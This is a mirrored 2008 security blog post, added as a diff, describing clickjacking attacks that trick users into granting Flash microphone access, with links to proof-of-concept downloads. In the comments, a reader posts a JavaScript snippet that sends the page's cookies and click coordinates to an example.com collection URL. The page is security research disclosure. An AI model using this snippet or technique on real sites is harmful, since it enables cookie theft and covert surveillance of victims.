@@ -1,0 +1,239 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" dir="ltr" lang="en-US">
+	
+<!-- Mirrored from www.gnucitizen.org/blog/more-advanced-clickjacking-ui-redress-attacks/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:23:46 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
+		<link rel="profile" href="http://gmpg.org/xfn/11"/>
+		<link rel="pingback" href="../../wordpress/xmlrpc.php" />
+		<link rel="alternate" type="application/rdf+xml" title="GNUCITIZEN" href="../../feed/rdf/index.html"/>
+		<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN" href="../../feed/rss/index.html"/>
+		<link rel="alternate" type="application/atom+xml" title="GNUCITIZEN" href="../../feed/atom/index.html"/>
+		<link rel="stylesheet" type="text/css" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/style.css"/>
+		<title>GNUCITIZEN &raquo; More Advanced Clickjacking &#8211; UI Redress Attacks</title>
+			<meta name="google-site-verification" content="yfE2zXU6xxSUp1CWarDop_6vVdGUUplpLF8P5Xe2fWM"/>
+	<link rel="icon" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/styles/images/favicon.ico" type="image/x-icon"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Comments" href="http://feedproxy.google.com/gnucitizenComments"/>
+	<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Group" href="http://feedproxy.google.com/gnucitizenGroup"/>
+	<link rel="stylesheet" href="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.css" type="text/css" media="screen"/>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/jquery.core.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scriptlets/slimbox2/slimbox2.js" type="text/javascript"></script>
+	<script src="../../wordpress/wp-content/themes/gnucitizen.org-v2/scripts/gnucitizen.common.js" type="text/javascript"></script>
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN &raquo; More Advanced Clickjacking &#8211; UI Redress Attacks Comments Feed" href="feed/index.html" />
+<link rel="EditURI" type="application/rsd+xml" title="RSD" href="../../wordpress/xmlrpc0db0.php?rsd" />
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="http://www.gnucitizen.org/wordpress/wp-includes/wlwmanifest.xml" /> 
+<link rel='prev' title='Security Certifications' href='../security-certifications/index.html' />
+<link rel='next' title='Compliance' href='../compliance/index.html' />
+<meta name="generator" content="WordPress 3.3.2" />
+<link rel='canonical' href='index.html' />
+<link rel='shortlink' href='../../index6dc7.html?p=1535' />
+<link rel="alternate" type="application/rss+xml" title="GNUCITIZEN Network" href="http://feedproxy.google.com/gnucitizenNetwork"/>	</head>
+	
+	<body id="single" class="blog">
+		<div id="header">
+			<h1><a href="../../index.html"><span>GNUCITIZEN</span></a></h1>
+			<p><span>Information Security Think Tank</span></p>
+		</div>
+
+<div id="navigation">
+	<h2>Navigation</h2>
+	<ul>
+		<li class="cat-item cat-item-2"><a href="../../categories/blog/index.html" title="View all posts filed under Blog">Blog</a></li>
+		<li class="page_item page-item-266"><a href="../../archive/index.html">Archive</a></li>
+<li class="page_item page-item-236"><a href="../../about/index.html">About</a></li>
+<li class="page_item page-item-336"><a href="../../index.html">Home</a></li>
+			</ul>
+</div>
+
+<div id="content">
+			<div id="entry">
+							<div id="post-1535" class="post">
+	<div class="post-title"><h2><span>More Advanced Clickjacking &#8211; UI Redress Attacks</span></h2></div>
+	<div class="post-date"><span>published:</span> October 8th, 2008</div>
+	<div class="post-content"><div class="single-content-top-widgets"></div><p>This will be a quick post just to share some POCs and more information regarding the recent <a href="../clickjacking-and-flash/index.html">Clickjacking</a> technique, i.e. UI Redress Attack, a name suggested by Michael Zalewski.</p>
+
+<p>Clickjacking is an oldie but, a goodie. You can track the origin of the attack back at the beginning of this decade. Clickjacking is essentially the anti-CSRF killer. It is also the killer of Flash, AJAX (because AJAX apps are sometimes easier to clickjack, look at Google) and some other technologies. <q>Clickjacking</q> is perhaps not the perfect name to depict this class of attacks but it is a cool one.</p>
+
+<p>The picture that you see in this post is basically a UI redress attack against Flash. It works flawlessly on Ubuntu with the latest Firefox, Flash and the latest NoScript with the applied fixes against the clickjacking technique, i.e. ClearClick. I do not know why it works but it works. Btw, the POC that you&#8217;ve probably seen to circulate in the last couple of days does not work on my setup.</p>
+
+<p>The attack depicted here is very, very simple. All I do is UI redressing an evil iframe with preloaded malicious Flash file. In order to do that I use blank, absolute positioned iframes. At the end I color the entire page with the same color the standard Flash security dialog is using for displaying security messages. As you can see the user cannot do anything else but to click the <code>allow</code> button, upon which the attacker will start surveying the sound of the room the victim currently occupies.</p>
+
+<blockquote>The solution for Flash is very simple. Show pop-up dialogs just like the ones used by signed Java applets, but make them more informational. Keep in mind though, that this solution can be abused to create rather annoying situations.</blockquote>
+
+<p><em>You can download my POCs from <a href="../../static/blog/2008/10/clickjacking-pocs.zip">here</a> and <a href="../../static/blog/2008/10/clickjacking-pocs2.zip">here</a>.</em></p>
+
+<div class="screen"><img src="../../static/blog/2008/10/flash-redress-01-300x151.png" alt="Flash Redress 01" title="Flash Redress 01" width="300" height="151" class="alignnone size-medium wp-image-2371" /> <img src="../../static/blog/2008/10/flash-redress-02-300x131.png" alt="Flash Redress 02" title="Flash Redress 02" width="300" height="131" class="alignnone size-medium wp-image-2372" /></div><div class="single-content-bottom-widgets"></div></div>
+	<ul class='post-meta'>
+<li><span class='post-meta-key'>Download:</span> <a href="../../static/blog/2008/10/clickjacking-pocs.zip">clickjacking-pocs.zip</a>, <a href="../../static/blog/2008/10/clickjacking-pocs2.zip">clickjacking-pocs2.zip</a>, <a href="../../static/blog/2008/10/flash-redress-01.png">flash-redress-01.png</a>, <a href="../../static/blog/2008/10/flash-redress-02.png">flash-redress-02.png</a></li>
+</ul>
+	<div class="post-links"><a href="index.html">more</a> | <a href="index.html#post-comments">comments</a> | <a href='feed/index.html'>comments rss</a> | posted by <a href="../../author/pdp/index.html" title="Posts by pdp" rel="author">pdp</a></div>
+	<div class="post-tags">Tags: <a href="../../tags/0day/index.html" rel="tag">0day</a> | <a href="../../tags/clickjacking/index.html" rel="tag">clickjacking</a> | <a href="../../tags/hack/index.html" rel="tag">hack</a> | <a href="../../tags/security/index.html" rel="tag">security</a> | <a href="../../tags/ui/index.html" rel="tag">ui</a> | <a href="../../tags/ui-attacks/index.html" rel="tag">ui attacks</a> | <a href="../../tags/ui-redress/index.html" rel="tag">ui redress</a> | <a href="../../tags/ui-redress-attacks/index.html" rel="tag">ui redress attacks</a></div></div>
+				
+
+				<div id="post-comments">
+					<div class="comment even thread-even depth-1" id="comment-123963">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/27a21572566e7cbb44e0d33ef6b0b6e1?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">unwiredbrain</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123963">
+			October 8, 2008 at 10:39 pm</a>		</div>
+
+		<p>Little point of interest: an attacker could be very interested in <strong>where</strong> the victim clicked.</p>
+<p>I mean: placing the attack on multiple elements can give to the attacker informations about page &#8220;hot spots&#8221; i.e. where the people most commonly click, allowing them to profile a better attack, according to the user feedback.</p>
+<p>Here&#8217;s the code:</p>
+<pre><code>var request = "http://www.example.com/collectingDataScript.jpg?l="
+        + escape(document.location) + "&amp;c=" + escape(document.cookie) + "&amp;x="
+        + c.x + "&amp;y=" + c.y;
+
+var clickLogger = document.createElement("img");
+    clickLogger.setAttribute("style", "position:absolute;left:-9999px;width:0;height:0;");
+    clickLogger.setAttribute("src", request);</code></pre>
+<p>If you&#8217;re using Firebug, you&#8217;ll see in the Net panel the requests the script makes.</p>
+<p>Going a little further, in HTML 5 frames can send messages to each other [1], so there will be no more need to use a double click: the inline frame will only have to watch for messages from the hosting window!</p>
+<p>[1] <a href="http://it.youtube.com/watch?v=xIxDJof7xxQ" rel="nofollow">http://it.youtube.com/watch?v=xIxDJof7xxQ</a> &#8212; from 05:40 to 15:20</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-123965">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/be3b138352dc100c9459e612b275b413?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">mindcorrosive</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123965">
+			October 9, 2008 at 12:51 am</a>		</div>
+
+		<p>I never knew that it was *that* easy.. Though you could probably mask the suspicious Flash-UI &#8220;Allow&#8221; button with an UI element as well, for maximum user frustration..</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment even thread-even depth-1" id="comment-123966">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/a91d8b2df902bcca4415f304dc589ec3?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">Mr.V</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123966">
+			October 9, 2008 at 3:54 am</a>		</div>
+
+		<p>I&#8217;m getting noscript&#8217;s clicjacking warning every time I try to open google images :( help.</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-123967">
+				<div class="comment-author vcard">
+		<img alt='' src='http://1.gravatar.com/avatar/93fbcd57493dcc4f89fe44b8484237fe?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>gnucitizen reader</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123967">
+			October 9, 2008 at 6:54 am</a>		</div>
+
+		<p>is it just me or any of your pocs are prepared to be functional?</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment byuser comment-author-admin even thread-even depth-1" id="comment-123969">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/02ad2ea464a98737d78746fa7b7c36b6?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn"><a href='../../index.html' rel='external nofollow' class='url'>pdp</a></cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123969">
+			October 9, 2008 at 7:54 am</a>		</div>
+
+		<p>the pocs are fully functional. they have been verified by a few close friends. </p>
+<p>unwiredbrain, you are absolutely right. I could have made the event bubble but a POC is a POC and nothing more :)</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		<div class="comment odd alt thread-odd thread-alt depth-1" id="comment-123981">
+				<div class="comment-author vcard">
+		<img alt='' src='http://0.gravatar.com/avatar/27a21572566e7cbb44e0d33ef6b0b6e1?s=32&amp;d=retro&amp;r=G' class='avatar avatar-32 photo' height='32' width='32' />		<cite class="fn">unwiredbrain</cite> <span class="says">says:</span>		</div>
+
+		<div class="comment-meta commentmetadata"><a href="comment-page-1/index.html#comment-123981">
+			October 9, 2008 at 5:29 pm</a>		</div>
+
+		<p><strong>pdp</strong>, yeah, my biggest interest was pointing out that in the next HTML specification things about clickjacking will be easier than ever to set up.</p>
+<p>The <em>where-victim-clicked</em> stuff was my POC of your POC ;-) :-P</p>
+
+		<div class="reply">
+				</div>
+		</div>
+		</div>
+		
+		<div class="post-comments-navigation">
+			<div class="older-comments"></div>
+			<div class="newer-comments"></div>
+		</div>
+	
+	<div id="post-response">
+		<h2>Respond</h2>
+					<form action="http://www.gnucitizen.org/wordpress/wp-comments-post.php" name="response-form" method="post" class="response-form">
+				<p><em>We retain the right to remove any comment or trackback we determine to be, at our sole discretion, unacceptable.</em></p>
+									<div><label for="author">name: (required)</label></div>
+					<div><input type="text" name="author" id="author" value="" size="20" tabindex="1"/></div>
+					<div><label for="email">mail: (required)</label></div>
+					<div><input type="text" name="email" id="email" value="" size="20" tabindex="2"/></div>
+					<div><label for="url">website:</label></div>
+					<div><input type="text" name="url" id="url" value="" size="20" tabindex="3"/></div>
+								<div><label for="comment">comment:</label></div>
+				<div><textarea name="comment" id="comment" cols="50" rows="10" tabindex="4"></textarea></div>
+				<div>
+					<input class="button" name="submit" type="submit" id="submit" tabindex="5" value="submit"/>
+					<input class="button" name="reset" type="reset" id="reset" tabindex="6" value="reset"/>
+				</div>
+				<input type="hidden" name="comment_post_ID" value="1535"/>
+				<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="29c7a9aa27" /></p>
+
+	<p style="clear: both;" class="subscribe-to-comments">
+	<input type="checkbox" name="subscribe" id="subscribe" value="subscribe" style="width: auto;" />
+	<label for="subscribe">Notify me of followup comments via e-mail</label>
+	</p>
+
+
+			</form>
+			</div>
+					</div>
+		<div id="content-sidebar">					<div class="widget">			<p style="font-size:24px"><em>Get <a href="http://www.websecurify.com/">Websecurify</a> - a cross-platform web security testing technology designed from the ground up with simplicity in mind.</em></p>			</div>			</div></div>
+
+				
+		<div id="footer">
+			
+	<script type="text/javascript">
+		var gaJsHost = (('https:' == document.location.protocol) ? 'https://ssl.' : 'http://www.');
+		document.write(unescape('%3Cscript src="' + gaJsHost + 'google-analytics.com/ga.js" type="text/javascript"%3E%3C/script%3E'));
+	</script>
+	<script type="text/javascript">
+		var pageTracker = _gat._getTracker('UA-363996-1');
+		pageTracker._initData();
+		pageTracker._trackPageview();
+	</script>
+
+				<p>(<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/2.5/" title="Creative Commons Attribution-Noncommercial-No Derivative Works 2.5 Generic">CC</a>)2005-2012 <a href="../../index.html" title="Information Security Think Tank">GNUCITIZEN</a></p>
+		</div>
+		
+		<!-- <rdf:RDF xmlns="http://web.resource.org/cc/" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:rdf="http://www.w3.org/1999/02/22-rdf-syntax-ns#">
+			<Work rdf:about="">
+				<license rdf:resource="http://creativecommons.org/licenses/by-nc-nd/2.5/"/>
+				<dc:title>GNUCITIZEN</dc:title>
+				<dc:date>2005-2012</dc:date>
+				<dc:creator><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:creator>
+				<dc:rights><Agent><dc:title>GNUCITIZEN</dc:title></Agent></dc:rights>
+				<dc:type rdf:resource="http://purl.org/dc/dcmitype/Text"/>
+				<dc:source rdf:resource="http://www.gnucitizen.org"/>
+			</Work>
+			<License rdf:about="http://creativecommons.org/licenses/by-nc-nd/2.5/">
+				<permits rdf:resource="http://web.resource.org/cc/Reproduction"/>
+				<permits rdf:resource="http://web.resource.org/cc/Distribution"/>
+				<requires rdf:resource="http://web.resource.org/cc/Notice"/>
+				<requires rdf:resource="http://web.resource.org/cc/Attribution"/>
+				<prohibits rdf:resource="http://web.resource.org/cc/CommercialUse"/>
+			</License>
+		</rdf:RDF> -->
+		
+		<!-- tested by blogsecurify -->
+		<!-- wpscanner -->
+	</body>
+
+<!-- Mirrored from www.gnucitizen.org/blog/more-advanced-clickjacking-ui-redress-attacks/ by HTTrack Website Copier/3.x [XR&CO'2010], Sat, 07 Jul 2012 14:23:51 GMT -->
+<!-- Added by HTTrack --><meta http-equiv="content-type" content="text/html;charset=UTF-8"><!-- /Added by HTTrack -->
+</html>
